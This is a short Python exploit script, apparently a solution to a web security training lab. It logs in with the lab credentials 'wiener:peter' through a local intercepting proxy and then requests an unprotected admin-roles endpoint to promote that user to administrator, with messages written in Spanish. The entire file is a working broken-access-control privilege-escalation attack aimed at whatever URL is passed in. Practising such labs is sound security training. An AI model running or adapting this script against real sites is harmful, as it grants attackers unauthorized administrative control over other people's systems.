import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def upgrade_user_to_admin(session, base_url):
    """Login con user winier"""
    login_path = f'{base_url}/login'
    login_data = {'username': 'wiener','password': 'peter'}
    response = session.post(login_path, data=login_data, verify=False, proxies=proxies_setting)
    if response.status_code == 200:
        print("[+] Login exitoso")
        
        """upgrade user admin to winier"""
        admin_path = f'{base_url}/admin-roles?username=wiener&action=upgrade'
        response = session.get(admin_path, verify=False, proxies=proxies_setting)
        if 'Admin panel' in response.text:
            print("[+] Usuario promovido a admin")
        else:
            print("[-] No fue posible promover el usuario")
        
    else:
        print("[-] Login fallido")


def main():
    if len(sys.argv) !=2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    upgrade_user_to_admin(session, base_url)

if __name__ == "__main__":
    main()